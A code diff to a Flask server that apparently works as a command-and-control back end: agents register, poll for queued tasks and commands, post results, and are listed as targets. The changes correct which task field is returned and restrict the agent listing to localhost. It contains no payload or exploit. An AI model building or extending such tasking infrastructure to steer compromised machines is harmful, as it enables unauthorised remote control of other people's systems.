@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, abort
 from flask_sqlalchemy import SQLAlchemy
 import requests
 
@@ -19,7 +19,7 @@ class Agent(db.Model):
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     agent_id = db.Column(db.String(100), db.ForeignKey('agent.agent_id'), nullable=False)
-    action = db.Column(db.String(500), nullable=False)
+    action = db.Column(db.String(500), nullable=True,default="NULL")
     command = db.Column(db.String(500), nullable=True,default="NULL")
     filename = db.Column(db.String(100), nullable=True,default="NULL")
     completed = db.Column(db.Boolean, default=False)
@@ -27,6 +27,14 @@ class Task(db.Model):
 # Initialize database
 with app.app_context():
     db.create_all()
+
+def restrict_remote(func):
+    def wrapper(*args, **kwargs):
+        if request.remote_addr not in ['127.0.0.1',"::1"]:
+            abort(403)
+        return func(*args, **kwargs)
+    wrapper.__name__ = func.__name__  # To preserve function name for Flask routing
+    return wrapper
 
 @app.route('/register', methods=['POST'])
 def register_agent():
@@ -46,20 +54,18 @@ def register_agent():
     return jsonify({"error": "Invalid data"}), 400
 
 @app.route('/get-agents', methods=['GET'])
+@restrict_remote
 def get_agents():
     agents = Agent.query.all()
     agents = [{"agent_id": agent.agent_id, "status": agent.status} for agent in agents]
     return jsonify(agents)
 
-
-
 @app.route('/targets', methods=['GET'])
 def get_targets():
     targets = ""
-    agents = Agent.query.all()
+    agents = Agent.query.filter_by(targeted=True).all()
     for agent in agents:
-        if agent.targeted == True:
-            targets += agent.agent_id + "\n"
+        targets += agent.agent_id + "\n"
     return targets
 
 @app.route('/results', methods=['POST'])
@@ -95,11 +101,11 @@ def get_task():
         task = Task.query.filter_by(agent_id=agent_id, completed=False).first()
         if task:
             task_data = {
-                'action': task.command,
+                'action': task.action,
                 'task_id': task.id
             }
             return jsonify(task_data)
-    return jsonify({'command': 'NULL'})
+    return jsonify({'action': 'NULL'})
 
 @app.route('/', methods=['GET'])
 def homepage():
